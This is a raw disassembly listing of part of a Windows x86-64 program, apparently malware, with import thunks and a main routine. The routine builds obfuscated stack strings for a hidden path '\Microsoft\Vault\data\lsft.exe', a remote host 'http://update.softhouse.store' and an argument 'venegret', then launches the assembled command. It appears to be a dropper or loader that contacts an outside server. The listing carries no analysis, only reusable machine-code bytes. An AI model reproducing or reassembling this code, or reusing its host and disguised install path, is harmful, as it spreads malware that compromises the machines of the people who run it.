  402df8:	ff 25 4e 66 00 00    	jmp    *0x664e(%rip)        # 0x40944c
  402dfe:	90                   	nop
  402dff:	90                   	nop
  402e00:	ff 25 3e 66 00 00    	jmp    *0x663e(%rip)        # 0x409444
  402e06:	90                   	nop
  402e07:	90                   	nop
  402e08:	ff 25 2e 66 00 00    	jmp    *0x662e(%rip)        # 0x40943c
  402e0e:	90                   	nop
  402e0f:	90                   	nop
  402e10:	ff 25 1e 66 00 00    	jmp    *0x661e(%rip)        # 0x409434
  402e16:	90                   	nop
  402e17:	90                   	nop
  402e18:	ff 25 0e 66 00 00    	jmp    *0x660e(%rip)        # 0x40942c
  402e1e:	90                   	nop
  402e1f:	90                   	nop
  402e20:	ff 25 fe 65 00 00    	jmp    *0x65fe(%rip)        # 0x409424
  402e26:	90                   	nop
  402e27:	90                   	nop
  402e28:	ff 25 ee 65 00 00    	jmp    *0x65ee(%rip)        # 0x40941c
  402e2e:	90                   	nop
  402e2f:	90                   	nop
  402e30:	ff 25 de 65 00 00    	jmp    *0x65de(%rip)        # 0x409414
  402e36:	90                   	nop
  402e37:	90                   	nop
  402e38:	ff 25 ce 65 00 00    	jmp    *0x65ce(%rip)        # 0x40940c
  402e3e:	90                   	nop
  402e3f:	90                   	nop
  402e40:	ff 25 be 65 00 00    	jmp    *0x65be(%rip)        # 0x409404
  402e46:	90                   	nop
  402e47:	90                   	nop
  402e48:	ff 25 ae 65 00 00    	jmp    *0x65ae(%rip)        # 0x4093fc
  402e4e:	90                   	nop
  402e4f:	90                   	nop
  402e50:	ff 25 9e 65 00 00    	jmp    *0x659e(%rip)        # 0x4093f4
  402e56:	90                   	nop
  402e57:	90                   	nop
  402e58:	ff 25 8e 65 00 00    	jmp    *0x658e(%rip)        # 0x4093ec
  402e5e:	90                   	nop
  402e5f:	90                   	nop
  402e60:	ff 25 7e 65 00 00    	jmp    *0x657e(%rip)        # 0x4093e4
  402e66:	90                   	nop
  402e67:	90                   	nop
  402e68:	ff 25 6e 65 00 00    	jmp    *0x656e(%rip)        # 0x4093dc
  402e6e:	90                   	nop
  402e6f:	90                   	nop
  402e70:	ff 25 5e 65 00 00    	jmp    *0x655e(%rip)        # 0x4093d4
  402e76:	90                   	nop
  402e77:	90                   	nop
  402e78:	ff 25 46 65 00 00    	jmp    *0x6546(%rip)        # 0x4093c4
  402e7e:	90                   	nop
  402e7f:	90                   	nop
  402e80:	ff 25 36 65 00 00    	jmp    *0x6536(%rip)        # 0x4093bc
  402e86:	90                   	nop
  402e87:	90                   	nop
  402e88:	ff 25 1e 65 00 00    	jmp    *0x651e(%rip)        # 0x4093ac
  402e8e:	90                   	nop
  402e8f:	90                   	nop
  402e90:	ff 25 0e 65 00 00    	jmp    *0x650e(%rip)        # 0x4093a4
  402e96:	90                   	nop
  402e97:	90                   	nop
  402e98:	ff 25 fe 64 00 00    	jmp    *0x64fe(%rip)        # 0x40939c
  402e9e:	90                   	nop
  402e9f:	90                   	nop
  402ea0:	ff 25 de 64 00 00    	jmp    *0x64de(%rip)        # 0x409384
  402ea6:	90                   	nop
  402ea7:	90                   	nop
  402ea8:	ff 25 ce 64 00 00    	jmp    *0x64ce(%rip)        # 0x40937c
  402eae:	90                   	nop
  402eaf:	90                   	nop
  402eb0:	53                   	push   %rbx
  402eb1:	48 83 ec 20          	sub    $0x20,%rsp
  402eb5:	89 cb                	mov    %ecx,%ebx
  402eb7:	e8 54 00 00 00       	call   0x402f10
  402ebc:	89 d9                	mov    %ebx,%ecx
  402ebe:	48 8d 14 49          	lea    (%rcx,%rcx,2),%rdx
  402ec2:	48 c1 e2 04          	shl    $0x4,%rdx
  402ec6:	48 01 d0             	add    %rdx,%rax
  402ec9:	48 83 c4 20          	add    $0x20,%rsp
  402ecd:	5b                   	pop    %rbx
  402ece:	c3                   	ret
  402ecf:	90                   	nop
  402ed0:	48 8b 05 79 5a 00 00 	mov    0x5a79(%rip),%rax        # 0x408950
  402ed7:	c3                   	ret
  402ed8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  402edf:	00 
  402ee0:	48 89 c8             	mov    %rcx,%rax
  402ee3:	48 87 05 66 5a 00 00 	xchg   %rax,0x5a66(%rip)        # 0x408950
  402eea:	c3                   	ret
  402eeb:	90                   	nop
  402eec:	90                   	nop
  402eed:	90                   	nop
  402eee:	90                   	nop
  402eef:	90                   	nop
  402ef0:	48 8b 05 a9 24 00 00 	mov    0x24a9(%rip),%rax        # 0x4053a0
  402ef7:	48 8b 00             	mov    (%rax),%rax
  402efa:	c3                   	ret
  402efb:	90                   	nop
  402efc:	90                   	nop
  402efd:	90                   	nop
  402efe:	90                   	nop
  402eff:	90                   	nop
  402f00:	48 8b 05 a9 24 00 00 	mov    0x24a9(%rip),%rax        # 0x4053b0
  402f07:	48 8b 00             	mov    (%rax),%rax
  402f0a:	c3                   	ret
  402f0b:	90                   	nop
  402f0c:	90                   	nop
  402f0d:	90                   	nop
  402f0e:	90                   	nop
  402f0f:	90                   	nop
  402f10:	ff 25 7e 64 00 00    	jmp    *0x647e(%rip)        # 0x409394
  402f16:	90                   	nop
  402f17:	90                   	nop
  402f18:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  402f1f:	00 
  402f20:	ff 25 66 65 00 00    	jmp    *0x6566(%rip)        # 0x40948c
  402f26:	90                   	nop
  402f27:	90                   	nop
  402f28:	ff 25 56 65 00 00    	jmp    *0x6556(%rip)        # 0x409484
  402f2e:	90                   	nop
  402f2f:	90                   	nop
  402f30:	ff 25 36 64 00 00    	jmp    *0x6436(%rip)        # 0x40936c
  402f36:	90                   	nop
  402f37:	90                   	nop
  402f38:	ff 25 26 64 00 00    	jmp    *0x6426(%rip)        # 0x409364
  402f3e:	90                   	nop
  402f3f:	90                   	nop
  402f40:	ff 25 16 64 00 00    	jmp    *0x6416(%rip)        # 0x40935c
  402f46:	90                   	nop
  402f47:	90                   	nop
  402f48:	ff 25 06 64 00 00    	jmp    *0x6406(%rip)        # 0x409354
  402f4e:	90                   	nop
  402f4f:	90                   	nop
  402f50:	ff 25 f6 63 00 00    	jmp    *0x63f6(%rip)        # 0x40934c
  402f56:	90                   	nop
  402f57:	90                   	nop
  402f58:	ff 25 e6 63 00 00    	jmp    *0x63e6(%rip)        # 0x409344
  402f5e:	90                   	nop
  402f5f:	90                   	nop
  402f60:	ff 25 d6 63 00 00    	jmp    *0x63d6(%rip)        # 0x40933c
  402f66:	90                   	nop
  402f67:	90                   	nop
  402f68:	ff 25 c6 63 00 00    	jmp    *0x63c6(%rip)        # 0x409334
  402f6e:	90                   	nop
  402f6f:	90                   	nop
  402f70:	ff 25 b6 63 00 00    	jmp    *0x63b6(%rip)        # 0x40932c
  402f76:	90                   	nop
  402f77:	90                   	nop
  402f78:	ff 25 a6 63 00 00    	jmp    *0x63a6(%rip)        # 0x409324
  402f7e:	90                   	nop
  402f7f:	90                   	nop
  402f80:	ff 25 96 63 00 00    	jmp    *0x6396(%rip)        # 0x40931c
  402f86:	90                   	nop
  402f87:	90                   	nop
  402f88:	ff 25 86 63 00 00    	jmp    *0x6386(%rip)        # 0x409314
  402f8e:	90                   	nop
  402f8f:	90                   	nop
  402f90:	ff 25 76 63 00 00    	jmp    *0x6376(%rip)        # 0x40930c
  402f96:	90                   	nop
  402f97:	90                   	nop
  402f98:	ff 25 66 63 00 00    	jmp    *0x6366(%rip)        # 0x409304
  402f9e:	90                   	nop
  402f9f:	90                   	nop
  402fa0:	ff 25 56 63 00 00    	jmp    *0x6356(%rip)        # 0x4092fc
  402fa6:	90                   	nop
  402fa7:	90                   	nop
  402fa8:	ff 25 46 63 00 00    	jmp    *0x6346(%rip)        # 0x4092f4
  402fae:	90                   	nop
  402faf:	90                   	nop
  402fb0:	ff 25 36 63 00 00    	jmp    *0x6336(%rip)        # 0x4092ec
  402fb6:	90                   	nop
  402fb7:	90                   	nop
  402fb8:	ff 25 26 63 00 00    	jmp    *0x6326(%rip)        # 0x4092e4
  402fbe:	90                   	nop
  402fbf:	90                   	nop
  402fc0:	ff 25 16 63 00 00    	jmp    *0x6316(%rip)        # 0x4092dc
  402fc6:	90                   	nop
  402fc7:	90                   	nop
  402fc8:	ff 25 06 63 00 00    	jmp    *0x6306(%rip)        # 0x4092d4
  402fce:	90                   	nop
  402fcf:	90                   	nop
  402fd0:	ff 25 f6 62 00 00    	jmp    *0x62f6(%rip)        # 0x4092cc
  402fd6:	90                   	nop
  402fd7:	90                   	nop
  402fd8:	ff 25 e6 62 00 00    	jmp    *0x62e6(%rip)        # 0x4092c4
  402fde:	90                   	nop
  402fdf:	90                   	nop
  402fe0:	ff 25 d6 62 00 00    	jmp    *0x62d6(%rip)        # 0x4092bc
  402fe6:	90                   	nop
  402fe7:	90                   	nop
  402fe8:	ff 25 c6 62 00 00    	jmp    *0x62c6(%rip)        # 0x4092b4
  402fee:	90                   	nop
  402fef:	90                   	nop
  402ff0:	ff 25 b6 62 00 00    	jmp    *0x62b6(%rip)        # 0x4092ac
  402ff6:	90                   	nop
  402ff7:	90                   	nop
  402ff8:	ff 25 a6 62 00 00    	jmp    *0x62a6(%rip)        # 0x4092a4
  402ffe:	90                   	nop
  402fff:	90                   	nop
  403000:	ff 25 96 62 00 00    	jmp    *0x6296(%rip)        # 0x40929c
  403006:	90                   	nop
  403007:	90                   	nop
  403008:	ff 25 86 62 00 00    	jmp    *0x6286(%rip)        # 0x409294
  40300e:	90                   	nop
  40300f:	90                   	nop
  403010:	55                   	push   %rbp
  403011:	57                   	push   %rdi
  403012:	56                   	push   %rsi
  403013:	53                   	push   %rbx
  403014:	48 81 ec c8 01 00 00 	sub    $0x1c8,%rsp
  40301b:	e8 70 e9 ff ff       	call   0x401990
  403020:	48 8d 7c 24 28       	lea    0x28(%rsp),%rdi
  403025:	e8 86 e7 ff ff       	call   0x4017b0
  40302a:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi
  40302f:	b9 41 00 00 00       	mov    $0x41,%ecx
  403034:	e8 67 fd ff ff       	call   0x402da0
  403039:	31 c0                	xor    %eax,%eax
  40303b:	b9 11 00 00 00       	mov    $0x11,%ecx
  403040:	31 d2                	xor    %edx,%edx
  403042:	f3 48 ab             	rep stos %rax,(%rdi)
  403045:	b9 1e 00 00 00       	mov    $0x1e,%ecx
  40304a:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  403051:	00 00 
  403053:	48 c7 84 24 c0 00 00 	movq   $0x0,0xc0(%rsp)
  40305a:	00 00 00 00 00 
  40305f:	c7 07 00 00 00 00    	movl   $0x0,(%rdi)
  403065:	66 89 57 04          	mov    %dx,0x4(%rdi)
  403069:	48 8d bc 24 c8 00 00 	lea    0xc8(%rsp),%rdi
  403070:	00 
  403071:	f3 48 ab             	rep stos %rax,(%rdi)
  403074:	31 c9                	xor    %ecx,%ecx
  403076:	66 89 0f             	mov    %cx,(%rdi)
  403079:	48 8d 0d c7 1f 00 00 	lea    0x1fc7(%rip),%rcx        # 0x405047
  403080:	e8 8b fd ff ff       	call   0x402e10
  403085:	48 89 f1             	mov    %rsi,%rcx
  403088:	48 89 c2             	mov    %rax,%rdx
  40308b:	e8 58 fd ff ff       	call   0x402de8
  403090:	48 89 f2             	mov    %rsi,%rdx
  403093:	8b 0a                	mov    (%rdx),%ecx
  403095:	48 83 c2 04          	add    $0x4,%rdx
  403099:	8d 81 ff fe fe fe    	lea    -0x1010101(%rcx),%eax
  40309f:	f7 d1                	not    %ecx
  4030a1:	21 c8                	and    %ecx,%eax
  4030a3:	25 80 80 80 80       	and    $0x80808080,%eax
  4030a8:	74 e9                	je     0x403093
  4030aa:	89 c1                	mov    %eax,%ecx
  4030ac:	48 89 f3             	mov    %rsi,%rbx
  4030af:	c1 e9 10             	shr    $0x10,%ecx
  4030b2:	a9 80 80 00 00       	test   $0x8080,%eax
  4030b7:	0f 44 c1             	cmove  %ecx,%eax
  4030ba:	48 8d 4a 02          	lea    0x2(%rdx),%rcx
  4030be:	89 c7                	mov    %eax,%edi
  4030c0:	48 0f 44 d1          	cmove  %rcx,%rdx
  4030c4:	40 00 c7             	add    %al,%dil
  4030c7:	48 89 f1             	mov    %rsi,%rcx
  4030ca:	48 b8 5c 4d 69 63 72 	movabs $0x6f736f7263694d5c,%rax
  4030d1:	6f 73 6f 
  4030d4:	48 83 da 03          	sbb    $0x3,%rdx
  4030d8:	48 89 02             	mov    %rax,(%rdx)
  4030db:	48 b8 66 74 5c 56 61 	movabs $0x746c7561565c7466,%rax
  4030e2:	75 6c 74 
  4030e5:	48 89 42 08          	mov    %rax,0x8(%rdx)
  4030e9:	48 b8 5c 61 64 61 74 	movabs $0x5c61746164615c,%rax
  4030f0:	61 5c 00 
  4030f3:	48 89 42 10          	mov    %rax,0x10(%rdx)
  4030f7:	e8 e4 e6 ff ff       	call   0x4017e0
  4030fc:	8b 13                	mov    (%rbx),%edx
  4030fe:	48 83 c3 04          	add    $0x4,%rbx
  403102:	8d 82 ff fe fe fe    	lea    -0x1010101(%rdx),%eax
  403108:	f7 d2                	not    %edx
  40310a:	21 d0                	and    %edx,%eax
  40310c:	25 80 80 80 80       	and    $0x80808080,%eax
  403111:	74 e9                	je     0x4030fc
  403113:	48 8d ac 24 c0 00 00 	lea    0xc0(%rsp),%rbp
  40311a:	00 
  40311b:	89 c2                	mov    %eax,%edx
  40311d:	c1 ea 10             	shr    $0x10,%edx
  403120:	a9 80 80 00 00       	test   $0x8080,%eax
  403125:	48 89 e9             	mov    %rbp,%rcx
  403128:	0f 44 c2             	cmove  %edx,%eax
  40312b:	48 8d 53 02          	lea    0x2(%rbx),%rdx
  40312f:	89 c7                	mov    %eax,%edi
  403131:	48 0f 44 da          	cmove  %rdx,%rbx
  403135:	40 00 c7             	add    %al,%dil
  403138:	48 89 f2             	mov    %rsi,%rdx
  40313b:	48 bf 6c 73 66 74 2e 	movabs $0x6578652e7466736c,%rdi
  403142:	65 78 65 
  403145:	48 83 db 03          	sbb    $0x3,%rbx
  403149:	48 29 f3             	sub    %rsi,%rbx
  40314c:	48 8d 04 1e          	lea    (%rsi,%rbx,1),%rax
  403150:	48 89 38             	mov    %rdi,(%rax)
  403153:	48 8d 7b 09          	lea    0x9(%rbx),%rdi
  403157:	49 89 f8             	mov    %rdi,%r8
  40315a:	c6 40 08 00          	movb   $0x0,0x8(%rax)
  40315e:	e8 9d fc ff ff       	call   0x402e00
  403163:	4c 8d 44 3d 00       	lea    0x0(%rbp,%rdi,1),%r8
  403168:	c6 44 1d 08 20       	movb   $0x20,0x8(%rbp,%rbx,1)
  40316d:	48 b8 68 74 74 70 3a 	movabs $0x752f2f3a70747468,%rax
  403174:	2f 2f 75 
  403177:	49 89 00             	mov    %rax,(%r8)
  40317a:	b9 05 00 00 00       	mov    $0x5,%ecx
  40317f:	48 b8 70 64 61 74 65 	movabs $0x6f732e6574616470,%rax
  403186:	2e 73 6f 
  403189:	49 89 40 08          	mov    %rax,0x8(%r8)
  40318d:	48 b8 66 74 68 6f 75 	movabs $0x2e6573756f687466,%rax
  403194:	73 65 2e 
  403197:	49 89 40 10          	mov    %rax,0x10(%r8)
  40319b:	48 8d 44 1d 27       	lea    0x27(%rbp,%rbx,1),%rax
  4031a0:	41 c7 40 18 73 74 6f 	movl   $0x726f7473,0x18(%r8)
  4031a7:	72 
  4031a8:	41 c6 40 1c 65       	movb   $0x65,0x1c(%r8)
  4031ad:	c6 44 1d 26 20       	movb   $0x20,0x26(%rbp,%rbx,1)
  4031b2:	48 bb 76 65 6e 65 67 	movabs $0x74657267656e6576,%rbx
  4031b9:	72 65 74 
  4031bc:	48 89 18             	mov    %rbx,(%rax)
  4031bf:	c6 40 08 00          	movb   $0x0,0x8(%rax)
  4031c3:	e8 d8 fb ff ff       	call   0x402da0
  4031c8:	48 89 f1             	mov    %rsi,%rcx
  4031cb:	e8 b0 e5 ff ff       	call   0x401780
  4031d0:	85 c0                	test   %eax,%eax
  4031d2:	74 0e                	je     0x4031e2
  4031d4:	31 c0                	xor    %eax,%eax
  4031d6:	48 81 c4 c8 01 00 00 	add    $0x1c8,%rsp
  4031dd:	5b                   	pop    %rbx
  4031de:	5e                   	pop    %rsi
  4031df:	5f                   	pop    %rdi
  4031e0:	5d                   	pop    %rbp
  4031e1:	c3                   	ret
  4031e2:	b9 06 00 00 00       	mov    $0x6,%ecx
  4031e7:	e8 b4 fb ff ff       	call   0x402da0
  4031ec:	48 89 f1             	mov    %rsi,%rcx
  4031ef:	e8 8c e3 ff ff       	call   0x401580
  4031f4:	85 c0                	test   %eax,%eax
  4031f6:	74 dc                	je     0x4031d4
  4031f8:	b9 0f 00 00 00       	mov    $0xf,%ecx
  4031fd:	e8 9e fb ff ff       	call   0x402da0
  403202:	48 89 e9             	mov    %rbp,%rcx
  403205:	e8 c6 e4 ff ff       	call   0x4016d0
  40320a:	eb c8                	jmp    0x4031d4
  40320c:	90                   	nop
  40320d:	90                   	nop
  40320e:	90                   	nop
  40320f:	90                   	nop
  403210:	56                   	push   %rsi
  403211:	53                   	push   %rbx
  403212:	48 83 ec 38          	sub    $0x38,%rsp
  403216:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
  40321b:	48 89 cb             	mov    %rcx,%rbx
  40321e:	b9 02 00 00 00       	mov    $0x2,%ecx
  403223:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
  403228:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
  40322d:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
  403232:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  403237:	e8 74 fc ff ff       	call   0x402eb0
  40323c:	41 b8 1b 00 00 00    	mov    $0x1b,%r8d
  403242:	ba 01 00 00 00       	mov    $0x1,%edx
  403247:	48 8d 0d b2 1f 00 00 	lea    0x1fb2(%rip),%rcx        # 0x405200
  40324e:	49 89 c1             	mov    %rax,%r9
  403251:	e8 c2 fb ff ff       	call   0x402e18
  403256:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
  40325b:	b9 02 00 00 00       	mov    $0x2,%ecx
  403260:	e8 4b fc ff ff       	call   0x402eb0
  403265:	48 89 da             	mov    %rbx,%rdx
  403268:	48 89 c1             	mov    %rax,%rcx
  40326b:	49 89 f0             	mov    %rsi,%r8
  40326e:	e8 5d fb ff ff       	call   0x402dd0
  403273:	e8 d8 fb ff ff       	call   0x402e50
  403278:	90                   	nop
  403279:	90                   	nop
  40327a:	90                   	nop
  40327b:	90                   	nop
  40327c:	90                   	nop
  40327d:	90                   	nop
  40327e:	90                   	nop
  40327f:	90                   	nop
  403280:	e9 ab e2 ff ff       	jmp    0x401530
  403285:	90                   	nop
  403286:	90                   	nop
  403287:	90                   	nop
  403288:	90                   	nop
  403289:	90                   	nop
  40328a:	90                   	nop
  40328b:	90                   	nop
  40328c:	90                   	nop
  40328d:	90                   	nop
  40328e:	90                   	nop
  40328f:	90                   	nop
  403290:	ff                   	(bad)
  403291:	ff                   	(bad)
  403292:	ff                   	(bad)
  403293:	ff                   	(bad)
  403294:	ff                   	(bad)
  403295:	ff                   	(bad)
  403296:	ff                   	(bad)
  403297:	ff 80 32 40 00 00    	incl   0x4032(%rax)
	...
  4032a5:	00 00                	add    %al,(%rax)
  4032a7:	00 ff                	add    %bh,%bh
  4032a9:	ff                   	(bad)
  4032aa:	ff                   	(bad)
  4032ab:	ff                   	(bad)
  4032ac:	ff                   	(bad)
  4032ad:	ff                   	(bad)
  4032ae:	ff                   	(bad)
  4032af:	ff 00                	incl   (%rax)
  4032b1:	00 00                	add    %al,(%rax)
  4032b3:	00 00                	add    %al,(%rax)
  4032b5:	00 00                	add    %al,(%rax)
	...
